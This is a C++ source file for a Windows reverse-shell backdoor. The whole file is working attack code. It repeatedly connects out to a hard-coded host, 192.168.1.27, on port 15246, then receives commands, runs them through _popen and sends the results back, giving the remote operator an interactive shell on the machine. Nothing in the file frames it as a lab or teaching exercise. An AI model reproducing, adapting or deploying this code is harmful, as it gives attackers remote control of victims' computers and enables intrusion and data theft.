#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <stdio.h>
using namespace std;

#define PORT 15246
#define BUFFERSIZE 256
#define SEND 0
#define RECV 1
#define ERROR -1
#define SUCCESS 0

int connect_to_server(const char* addr);
void shell_to_server(int fd);
void command(int fd);
int receipt_confirmation(int sock,int check);
bool startsWith(const char *pre, const char *str);

int main()
{
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);
    while(1)
    {
        connect_to_server("192.168.1.27");
        Sleep(30000);
    }
    WSACleanup();
    return 0;
}


int connect_to_server(const char* addr)
{
    int sock;
    struct sockaddr_in server;
    int len;
    char str[BUFFERSIZE];
    sock = socket(PF_INET,SOCK_STREAM,0);
    if(sock==-1)
    {
        std::cout<<"Error while creating socket..."<<std::endl;
        return -1;
    }

    memset(&server, 0,sizeof(server));
    server.sin_family = PF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(addr);

    if (connect(sock,(const struct sockaddr*)&server,sizeof(server))!= 0)
    {
        std::cout<<"Error connecting socket..."<<std::endl;
        return -1;
    }
    while(1)
    {
        len = recv(sock,str,sizeof(str)-1,0);
        if(len>0)
        {
            str[len-1]='\0';
        }else{
            std::cerr<<"Error recv socket"<<std::endl;
            return -1;
        }
        std::cout<<"action recue :'"<<str<<"'"<<std::endl;
        if(strcmp(str,"start shell")==0)
        {
            std::cout<<"Lets start the shell...!"<<std::endl;
            shell_to_server(sock);
        }else if(strcmp(str,"cmd")==0)
        {
            printf("lancement de la commande sock\n");
                command(sock);
        }

    }
    closesocket(sock);
    return 0;

}
void command(int fd)
{
    const char quit_str[] ="quit: result";
    char str[BUFFERSIZE];
    ssize_t len;
    FILE* fp;
    len = recv(fd,str,sizeof(str),0);
    if(len>0)
    {
        printf("received :%s\n",str);
        str[len-1]='\0';
    }else{
        std::cerr<<"Error recv command"<<std::endl;
        return;
    }
    printf("Exec command: %s\n",str);
    fp = _popen(str,"r");
    if(fp)
    {
        while(fgets(str,BUFFERSIZE,fp)!=NULL)
        {
            len = send(fd,str,sizeof(str)-1,0);
            if(len == -1)
            {
                std::cerr<<"Error send command result"<<std::endl;
                return;
            }
            if( receipt_confirmation(fd ,RECV)== ERROR)
            {
                std::cerr<<"Error receipt confirmation"<<std::endl;
                return;
            }

        }
        fclose(fp);
    }
    len = send(fd,quit_str,strlen(quit_str),0);
    if(len==-1)
    {
        std::cerr<<"Error quit str"<<std::endl;
        return;
    }

}
void shell_to_server(int fd)
{
    const char prompt[]="$";
    const char quit_str[] ="quit: result";
    char str[BUFFERSIZE];
    ssize_t len;
    FILE *fp;
    while(1)
    {
        len = send(fd,prompt,strlen(prompt),0);
        if(len==-1)
        {
            std::cerr<<"Error send prompt"<<std::endl;
            return;
        }
        len = recv(fd,str,sizeof(str)-1,0);
        if(len>0)
        {
            str[len-1]='\0';
        }else{
            std::cerr<<"Error recv socket"<<std::endl;
            return;
        }
        std::cout<<"commande recue : "<<str<<std::endl;
        if(str[0]=='c'&&str[1]=='d')
        {
            chdir(str+3);
        }else if(startsWith("exit",str))
        {
            return;
        }
        else{
            fp = _popen(str,"r");
            if(fp)
            {
                while(fgets(str,BUFFERSIZE,fp)!=NULL)
                {
                    len = send(fd,str,sizeof(str)-1,0);
                    if(len == -1)
                    {
                        std::cerr<<"Error send command result"<<std::endl;
                    }
                    if( receipt_confirmation(fd ,RECV)== ERROR)
                    {
                        std::cerr<<"Error receipt confirmation"<<std::endl;
                        return;
                    }

                }
                fclose(fp);
            }
        }

        len = send(fd,quit_str,strlen(quit_str),0);
        if(len==-1)
        {
            std::cerr<<"Error quit str"<<std::endl;
            return;
        }

        if( receipt_confirmation(fd ,RECV)== ERROR)
        {
            std::cerr<<"Error receipt confirmation"<<std::endl;
            return;
        }
    }
    return;
}

int receipt_confirmation(int sock,int check)
{
    ssize_t len;

    if(check == RECV)
    {
        char str[3];
        len = recv(sock,str,sizeof(str)-1,0);
        if ( len > 0){
            str[len]='\0';

            if ( strcmp(str,"OK"))
            {
                return ERROR;
            }
        }else{
            std::cerr<<"Error recv ok"<<std::endl;
            return ERROR;
        }
    }else{
        char str[] = "OK";

        len = send(sock,str,strlen(str),0);
        if ( len == -1 )
        {
            std::cerr<<"Error send ok"<<std::endl;
            return ERROR;
        }
    }

    return SUCCESS;
}

bool startsWith(const char *pre, const char *str)
{
    size_t lenpre = strlen(pre),
           lenstr = strlen(str);
    return lenstr < lenpre ? false : strncmp(pre, str, lenpre) == 0;
}
